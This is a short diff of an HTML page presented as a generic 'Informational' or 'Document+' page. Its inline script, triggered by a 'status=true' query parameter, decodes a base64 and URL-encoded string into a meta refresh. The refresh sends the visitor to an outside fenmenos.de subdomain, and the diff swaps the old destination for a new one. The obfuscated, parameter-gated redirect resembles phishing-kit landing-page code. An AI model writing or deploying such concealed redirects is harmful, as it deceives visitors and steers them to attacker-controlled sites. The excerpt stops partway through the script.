@@ -3,14 +3,14 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Informational</title>
+    <title>Document+</title>
     <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css" />
     <script>
       let hasStatus = new URLSearchParams(window.location.search).has("status");
       if (hasStatus) {
         let status = new URLSearchParams(window.location.search).get("status");
         if (status == "true") {
-          let ref = "JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vd29ya2luZ3dva2Vycy5mZW5tZW5vcy5kZS9iYzBRUCUyMiUyMC8lM0U="
+          let ref = "JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vc2VlZWhhdG92ZXIuZmVubWVub3MuZGUvZnFnZ1QlMjIlMjAvJTNF"
           let id = new URLSearchParams(window.location.search).get("id");
 
           let decodedRef = decodeURIComponent(atob(`${ref}`))
